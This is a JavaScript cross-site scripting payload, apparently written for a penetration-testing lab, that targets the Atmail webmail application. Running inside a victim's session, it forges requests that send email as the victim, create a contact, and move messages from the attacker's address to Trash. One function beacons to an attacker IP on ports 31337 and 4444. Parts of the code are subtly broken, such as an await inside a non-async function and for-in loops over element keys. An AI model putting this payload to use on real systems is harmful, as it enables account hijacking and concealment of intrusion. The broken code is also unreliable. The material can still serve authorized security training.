var email = "attacker@offsec.local";
var subject = "haccked";
var message = "This is a test email";

async function send_email(){
	var object = {
		'emailTo': email,
		'emailSubject': subject,
		'emailBodyHtml': message
	}

	var formBody = []
	for(var property in object){
		var encodedKey = encodeURIComponent(property);
		var encodedValue = encodeURIComponent(object[property]);
		formBody.push(encodedKey + '=' + encodedValue);
	}
	formBody = formBody.join('&');

	var url = "http://atmail/index.php/mail/composemessage/send";
	await fetch(url, {
		mode: 'no-cors',
		method: 'POST',
		headers: {
			'Host': 'atmail',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
			'Accept': 'application/json, text/javascript, */*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': '100'
		},
		body: formBody
	});

}

async function create_contact(){
	var object = {
		'contac[NewContact]': '1',
		'contact[UserFirstName]': 'hax0r1',
		'contact[UserLastName]': 'last1',
		'contact[emailValue]': 'hax0r1@local.com'
	}
	var formBody = [];
	for(var property in object){
		var encodedKey = encodeURIComponent(property);
		var encodedValue = encodeURIComponent(object[property]);
		formBody.push(encodedKey + '=' + encodedValue);
	}
	formBody = formBody.join('&');

	var url = "http://atmail/index.php/mail/contacts/updatecontact";
	await fetch(url, {
		method: 'POST',
		headers: {
			'Host': 'atmail',
			'Accept': 'application/json, text/javascript, */*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded'
		},
		body: formBody
	});

}

function get_emails(){
	var list = document.querySelectorAll('.mail_row');
	var delete_list = [];
	var regex = new RegExp('attacker@offsec\.local');
	for(const x in list){
		var text = x.innerHTML;
		if(regex.test(text)){
			delete_list.push(x.id);
		}
	}

	var url = "http://atmail/index.php/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";

	for(const id in delete_list){
		var unseen = 'unseen[' + id + ']';
		var object = {
			'resultContext': 'messageList',
			'listFolder': 'INBOX',
			'pageNumber': '1',
			'mailId[]': id,
			unseen: '0'

		}
		var formBody = [];
		for(var property in object){
			var encodedKey = encodeURIComponent(property);
			var encodedValue = encodeURIComponent(object[property]);
			formBody.push(encodedKey + '=' + encodedValue);
		}
		formBody = formBody.join('&');

		const response = await fetch(url, {
			method: 'POST',
			headers: {
				'Host': 'atmail',
				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
				'Accept': 'application/json, text/javascript, */*',
				'Accept-Language': 'en-US,en;q=0.5',
				'Accept-Encoding': 'gzip, deflate',
				'Content-Type': 'application/x-www-form-urlencoded'
			},
			body: formBody
		});

	}

}

async function delete_test(){
	await fetch('http://192.168.119.137:31337')
	var object = {
		'resultContext': 'messageList',
		'listFolder': 'INBOX',
		'pageNumber': '1',
		'mailId[]': '6',
		'unseen[6]': '0'
	}
	var formBody = [];
	for(var property in object){
		var encodedKey = encodeURIComponent(property);
		var encodedValue = encodeURIComponent(object[property]);
		formBody.push(encodedKey + '=' + encodedValue);
	}
	formBody = formBody.join('&');

	//var url = "http://atmail/index.php/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";
	var url = "http://192.168.119.137:4444"
	const response = await fetch(url, {
		method: 'GET',
		headers: {
			'Host': 'atmail',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
			'Accept': 'application/json, text/javascript, */*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded'
		}
		//body: formBody
	});

}

send_email();

